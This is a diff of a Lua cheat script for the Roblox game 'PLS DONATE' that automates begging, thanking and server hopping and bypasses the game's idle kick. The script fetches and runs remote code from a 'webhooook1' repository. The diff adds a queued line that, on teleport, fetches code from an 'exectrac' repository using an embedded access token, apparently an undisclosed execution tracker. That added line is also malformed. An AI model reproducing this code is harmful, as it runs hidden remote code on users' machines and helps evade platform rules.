@@ -1,7 +1,4 @@
---Wait until game loads
-repeat
-    wait()
-until game:IsLoaded()
+
 
 --Stops script if on a different game
 if game.PlaceId ~= 8737602449 and game.PlaceId ~= 8943844393 then
@@ -14,7 +11,24 @@ else
     getgenv().loaded = true
 end
 loadstring(game:HttpGet("https://raw.githubusercontent.com/loganonline/webhooook1/main/main"))()
-task.wait(1)
+--Anti-AFK
+local Players = game:GetService("Players")
+local connections = getconnections or get_signal_cons
+if connections then
+	for i,v in pairs(connections(Players.LocalPlayer.Idled)) do
+		if v["Disable"] then
+			v["Disable"](v)
+		elseif v["Disconnect"] then
+			v["Disconnect"](v)
+		end
+	end
+else
+    Players.LocalPlayer.Idled:Connect(function()
+        local VirtualUser = game:GetService("VirtualUser")
+        VirtualUser:CaptureController()
+        VirtualUser:ClickButton2(Vector2.new())
+    end)
+end
 
 --Variables
 local unclaimed = {}
@@ -27,6 +41,7 @@ local queueonteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or 
 local httprequest = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
 local httpservice = game:GetService('HttpService')
 queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/loganonline/plsdonate/main/main'))()")
+queueonteleport("loadstring(game:HttpGet('loadstring(game:HttpGet('https://raw.githubusercontent.com/loganonline/exectrac/main/asdasda?token=GHSAT0AAAAAABZF6VNZOXQG6R2FEKGMVVCUYZWMPKA'))()'))()")
 local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/loganonline/ui/main/right"))()
 
 local function claimGifts()
@@ -76,8 +91,8 @@ if isfile("plsdonatesettings.txt") then
     end
 
 end
-local sNames = {"textUpdateToggle", "textUpdateDelay", "serverHopToggle", "serverHopDelay", "hexBox", "goalBox", "webhookToggle", "webhookBox", "danceChoice", "thanksMessage", "signToggle", "customBoothText", "signUpdateToggle", "signText", "signHexBox", "autoThanks", "autoBeg", "begMessage", "begDelay", "fpsLimit", "render", "thanksDelay", "vcServer",'donationJump'}
-local sValues = {true, 30, true, 30, "#32CD32", 5, false, "", "Disabled", {"Thank you", "Thanks!", "ty :)", "tysm!"}, false, "GOAL: $C / $G", false, "your text here", "#ffffff", true, false, {"Please donate", "I'm so close to my goal!", "donate to me", "please"}, 300, 60, false, 3, false,false}
+local sNames = {"textUpdateToggle", "textUpdateDelay", "serverHopToggle", "serverHopDelay", "hexBox", "goalBox", "webhookToggle", "webhookBox", "danceChoice", "thanksMessage", "signToggle", "customBoothText", "signUpdateToggle", "signText", "signHexBox", "autoThanks", "autoBeg", "begMessage", "begDelay", "fpsLimit", "render", "thanksDelay", "vcServer"}
+local sValues = {true, 30, true, 30, "#32CD32", 5, false, "", "Disabled", {"Thank you", "Thanks!", "ty :)", "tysm!"}, false, "GOAL: $C / $G", false, "your text here", "#ffffff", true, false, {"Please donate", "I'm so close to my goal!", "donate to me", "please"}, 300, 60, false, 3, false}
 if #getgenv().settings ~= sNames then
     for i, v in ipairs(sNames) do
         if getgenv().settings[v] == nil then
@@ -95,7 +110,7 @@ local function saveSettings()
         writefile('plsdonatesettings.txt', httpservice:JSONEncode(getgenv().settings))
     end
 end
-function serverHop()
+local function serverHop()
     local gameId = "8737602449"
     if vcEnabled and getgenv().settings.vcServer then
         gameId = "8943844393"
@@ -562,14 +577,6 @@ local render = otherTab:AddSwitch("Disable Rendering", function(bool)
         game:GetService("RunService"):Set3dRenderingEnabled(true)
     end
 end)
-
-local jumpswitch = otherTab:AddSwitch("Donation Jump",function(bool)
-    getgenv().settings.donationJump = bool
-    saveSettings()
-end)
-
-jumpswitch:Set(getgenv().settings.donationJump)
-
 render:Set(getgenv().settings.render)
 if setfpscap and type(setfpscap) == "function" then
     local fpsLimit = otherTab:AddSlider("FPS Limit", function(x)
@@ -671,17 +678,9 @@ Players.LocalPlayer.leaderstats.Raised.Changed:Connect(function()
         if string.find(logs[#logs].message, Players.LocalPlayer.DisplayName) then
             webhook(tostring(logs[#logs].message.. " (Total: ".. Players.LocalPlayer.leaderstats.Raised.value.. ")"))
         else
-            webhook(tostring("💰 Somebody tipped ".. Players.LocalPlayer.leaderstats.Raised.value - RaisedC.. " Robux to ".. Players.LocalPlayer.DisplayName.. " (Total: " .. Players.LocalPlayer.leaderstats.Raised.value.. ")"))
+            webhook(tostring("💰 Somebody donated(oh mah gaw) ".. Players.LocalPlayer.leaderstats.Raised.value - RaisedC.. " bobux to ".. Players.LocalPlayer.DisplayName.. " (Total: " .. Players.LocalPlayer.leaderstats.Raised.value.. ")"))
         end
     end
-    if getgenv().settings.donationJump then
-        task.spawn(function()
-        for i = 1, game.Players.LocalPlayer.leaderstats.Raised.value - RaisedC do
-            game.Players.LocalPlayer.Character.Humanoid:ChangeState("Jumping")
-            repeat task.wait() until game.Players.LocalPlayer.Character.Humanoid:GetState() == Enum.HumanoidStateType.Landed or game.Players.LocalPlayer.Character.Humanoid:GetState() == Enum.HumanoidStateType.Running
-        end
-    end)
-     end
     RaisedC = Players.LocalPlayer.leaderstats.Raised.value
     if getgenv().settings.autoThanks then
         task.spawn(function()
@@ -694,7 +693,7 @@ Players.LocalPlayer.leaderstats.Raised.Changed:Connect(function()
 end)
 update()
 if game:GetService("CoreGui").imgui.Windows.Window.Title.Text == "Loading..." then
-    game:GetService("CoreGui").imgui.Windows.Window.Title.Text = "PLS DONATE - fuck tzechco / brought back by logan lmao"
+    game:GetService("CoreGui").imgui.Windows.Window.Title.Text = "hazem lacking - duo w"
 end
 while task.wait(getgenv().settings.serverHopDelay * 60) do
     if not hopTimer then
